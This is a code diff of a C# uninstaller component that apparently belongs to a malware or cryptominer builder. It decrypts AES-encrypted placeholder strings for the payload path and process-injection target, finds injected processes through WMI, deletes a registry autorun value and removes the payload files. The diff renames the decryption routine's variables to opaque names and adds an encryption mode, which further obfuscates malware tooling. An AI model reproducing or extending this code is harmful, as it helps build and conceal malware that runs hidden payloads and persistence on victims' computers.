@@ -9,7 +9,6 @@ using System.Resources;
 using System.Threading;
 using System.Diagnostics;
 using Microsoft.Win32;
-using System.Linq;
 using System.Collections.Generic;
 using System.Management;
 #if DefDebug
@@ -20,9 +19,9 @@ using System.Windows.Forms;
 
 public partial class RUninstaller
 {
-    public static string rbD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH");
+    public static string rbD = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + RGetString("#LIBSPATH")).ToLower();
 #if DefSystem32
-    public static string rbD2 = Environment.SystemDirectory + @"\" + RGetString("#LIBSPATH");
+    public static string rbD2 = (Environment.SystemDirectory + @"\" + RGetString("#LIBSPATH")).ToLower();
 #endif
 
     public static void Main()
@@ -48,7 +47,7 @@ public partial class RUninstaller
             {
                 if (key != null)
                 {
-                    key.DeleteValue(Path.GetFileName(PayloadPath));
+                    key.DeleteValue(Path.GetFileName(PayloadPath).ToLower());
                 }
             }
         }
@@ -82,7 +81,7 @@ public partial class RUninstaller
         {
             var options = new ConnectionOptions();
             options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
+            var scope = new ManagementScope(@"\root\cimv2", options);
             scope.Connect();
 
             string wmiQuery = string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
@@ -118,7 +117,7 @@ public partial class RUninstaller
             Directory.Delete(rbD2, true);
 #endif
 #if DefInstall
-            File.Delete(PayloadPath);
+            File.Delete((PayloadPath).ToLower());
 #endif
         }
         catch (Exception ex)
@@ -152,27 +151,24 @@ public partial class RUninstaller
 
     public static string RGetString(string rarg1)
     {
-        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(rarg1)));
+        return Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String(rarg1)));
     }
 
-    public static byte[] RAES_Decryptor(byte[] rarg1)
+    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
     {
-        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
-        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
-        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
-        var symmetricKey = new RijndaelManaged();
-        symmetricKey.KeySize = 256;
-        symmetricKey.Mode = CipherMode.CBC;
-        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
-        using (var mStream = new MemoryStream())
+        var rarg3 = Encoding.ASCII.GetBytes("#IV");
+        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
+        using (var rarg7 = new MemoryStream())
         {
-            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
+            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
             {
-                cStream.Write(rarg1, 0, rarg1.Length);
-                cStream.Close();
+                rarg8.Write(rarg1, 0, rarg1.Length);
+                rarg8.Close();
             }
 
-            return mStream.ToArray();
+            return rarg7.ToArray();
         }
     }
 }
